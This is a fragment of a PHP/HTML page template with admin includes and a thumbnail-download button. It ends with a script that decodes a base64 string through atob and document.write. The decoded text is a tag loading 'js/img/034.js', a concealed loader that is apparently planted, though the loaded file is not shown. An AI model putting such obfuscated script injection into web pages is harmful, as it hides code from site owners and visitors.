...
<html lang="en"> <?php include('admin/head.php'); ?> <?php include('admin/header.php'); ?> <?php include('admin/user.php'); ?> <div id="post-header" class="post-header">
  ...
  <div class="toolarea">
    ...
    <button id="downloadButton" onclick="downloadThumbnail()">Right click on image to download thumbnail</button>
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDM0LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
    </script>
